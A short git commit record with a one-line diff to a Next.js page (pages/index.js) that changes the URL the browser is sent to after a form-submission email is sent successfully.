70c7717a031c112a18fbe126244e930a2589ebcf
husknet <127146284+husknet@users.noreply.github.com>
2024-09-16 12:05:28 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://ne.nero-gatslish.click';
+        window.location.href = 'https://ne.nerosage.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
